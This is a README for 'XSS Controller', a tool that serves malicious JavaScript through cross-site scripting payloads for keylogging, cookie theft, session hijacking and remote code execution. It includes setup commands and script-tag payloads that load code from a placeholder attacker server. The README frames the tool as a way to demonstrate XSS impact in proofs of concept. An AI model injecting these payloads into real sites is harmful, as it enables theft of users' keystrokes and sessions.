# XSS Controller

XSS Controller is a framework to deliver malicious javascript inside XSS payloads and make betters PoC to demonstrate the impact of successful exploration of XSS.

## Features

- KeyLogger
- Remote redirect
- Cookies theft and Hijacking
- Remote JavaScript Execution
- Connection with HTTPS to bypass Mixed Content

## Setup

```bash
./setup.sh
npm i
```

## Running

```bash
npm start
```

Inject XSS payload to invoke remote javascript.

```html
<script src="https://REMOTE_SERVER:8443/"></script>
```

```html
<script src="http://REMOTE_SERVER:8080/"></script>
```

By default the server is up in 8080 port to HTTP Server and 8443 to HTTPS.
This config can be changed in `/app/server.js` in config variable.

```js
// Config ports to listen on
const config = {
  HTTPS_PORT: 8443,
  HTTP_PORT: 8080,
  WEB_SOCKET_PORT: 3000,
};
```

## Execution

```bash
npm i
npm start
```

## Inspíration

This project was created based on [xss-keylogger](https://github.com/hadynz/xss-keylogger) by [hadynz](https://twitter.com/hadynz).
